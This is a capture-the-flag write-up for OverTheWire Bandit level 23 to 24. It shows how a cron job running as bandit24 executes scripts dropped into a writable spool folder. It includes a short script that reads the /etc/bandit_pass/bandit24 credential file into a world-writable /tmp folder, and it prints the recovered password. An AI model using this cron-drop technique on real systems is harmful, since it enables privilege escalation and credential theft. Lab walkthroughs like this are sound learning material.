# Bandit Level 23 → Level 24

## Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE 1:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

# Methodology
* In this level, we have also deal with cron jobs, bash scripts and permissions.
* First, we have to login as bandit23. Then do anything.
```
bandit23@bandit:~$ ls -al /etc/cron.d/
total 56
drwxr-xr-x   2 root root  4096 Jul  3 16:19 .
drwxr-xr-x 124 root root 12288 Jun 25 12:37 ..
-rw-r--r--   1 root root   102 Nov  5  2025 .placeholder
-r--r-----   1 root root    47 Jun 24 14:59 behemoth4_cleanup
-rw-r--r--   1 root root   127 Jul  3 16:19 clean_tmp
-rw-r--r--   1 root root   120 Jun 24 14:58 cronjob_bandit22
-rw-r--r--   1 root root   122 Jun 24 14:58 cronjob_bandit23
-rw-r--r--   1 root root   120 Jun 24 14:59 cronjob_bandit24
-rw-r--r--   1 root root   188 Feb 13 12:17 e2scrub_all
-r--r-----   1 root root    48 Jun 24 15:00 leviathan5_cleanup
-rw-------   1 root root   138 Jun 24 15:01 manpage3_resetpw_job
-rwx------   1 root root    52 Jun 24 15:02 otw-tmp-dir
```
* We'll be proceeding with `cronjob_bandit24`
```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ ls -al /usr/bin/cronjob_bandit24.sh 
-rwxr-x--- 1 bandit24 bandit23 438 Jun 24 14:59 /usr/bin/cronjob_bandit24.sh
```
* We have read and execute permission on `/usr/bin/cronjob_bandit24.sh`
```
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
* `shopt -s nullglob` means we can't use wildcards `*` to access the files
* Then going to `/var/spool/bandit23/foo`, if not exists then exit.
* if it exists, execute all the scripts in the directory `/var/spool/bandit23/foo`, and if the owner is bandit23, delete the file/script after 60 seconds, even if we are not the owner file gets deleted.
* Let's check the contents and permissions of `/var/spool/` and proceed further.
```
bandit23@bandit:~$ ls -al /var/spool/
total 24
drwxr-xr-x  6 root     root     4096 Jun 24 15:02 .
drwxr-xr-x 14 root     root     4096 Jun 25 12:37 ..
dr-xr-x---  3 bandit24 bandit23 4096 Jun 24 14:59 bandit24
drwxr-xr-x  3 root     root     4096 Jun 19 05:17 cron
drwxr-xr-x  2 root     root     4096 Jun 24 15:02 mail
drwx------  2 syslog   adm      4096 Mar 10 15:16 rsyslog
```
* We have read and execute permission on bandit24 directory.
```
bandit23@bandit:~$ ls -al /var/spool/bandit24/
total 56
dr-xr-x--- 3 bandit24 bandit23  4096 Jun 24 14:59 .
drwxr-xr-x 6 root     root      4096 Jun 24 15:02 ..
drwxrwx-wx 6 root     bandit24 45056 Aug 10 07:25 foo
```
* And we have write and execute permission on `foo` directory, meaning we can create files here and execute it but we don't have read permission that means we can't see the files meaning we cannot use `ls` or `find` to see files here.
```
bandit23@bandit:~$ cd /var/spool/bandit24/foo/

bandit23@bandit:/var/spool/bandit24/foo$ ls -al
ls: cannot open directory '.': Permission denied
```
* ***The cron job runs automatically with higher privileges (i.e., `bandit24`), bypassing our personal permission limits. Any script we drop into that folder will be executed by the system as that target user (`bandit24`), giving us access to files owned by bandit24.***
* Trust me, although, i know how permissions work, but still this didn't click at first in my mind.
* After many experiments, we are here, we will create a script here and read `/etc/bandit_pass/bandit24` that contains the password for bandit24.
```
bandit23@bandit:/var/spool/bandit24/foo$ nano shell.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

**shell.sh**
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/safe_folder/bandit24pass
echo "executed"
```
* Before creating above script, create a directory in /tmp and give necessary permissions.
```
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/safe_folder/
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 /tmp/safe_folder/
```
* Giving permission to execute.
```
bandit23@bandit:/var/spool/bandit24/foo$ chmod +x shell.sh
```
* if shell gets deleted before executing, repeat the process, create the script, give permission to execute.
```
bandit23@bandit:/var/spool/bandit24/foo$ ls -al /tmp/safe_folder/bandit24pass 
-rw-rw-r-- 1 bandit24 bandit24 33 Aug 10 07:52 
/tmp/safe_folder/bandit24pass

bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/safe_folder/bandit24pass 
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```
* We have now password for next level, bandit24.

## Key Takeaways / Concepts
- **Privilege Inheritance via Cron:** Automated system cron jobs execute scripts using the permissions of the designated owner (in this case, `bandit24`), entirely bypassing our personal user limitations.    
- **"Write-and-Execute-Only" (Drop-box) Directories:** A directory with `wx` permissions allows us to create and execute files inside it, but prevents us from reading its contents (`ls`, `find`, or wildcards will fail).
- **Bypassing Read Restrictions:** If a restricted directory contains data or files we cannot directly see or read, we can write a payload script and drop it into that directory. When the automated cron runner executes our script, it runs with higher privileges, letting us extract restricted files to a safe, readable location like `/tmp`.    
- **Proactive Preparation:** Always ensure, destination folders (e.g., in `/tmp`) and script permissions (`chmod +x`) are properly set up _before_ dropping files into a rapidly clearing automated spool directory.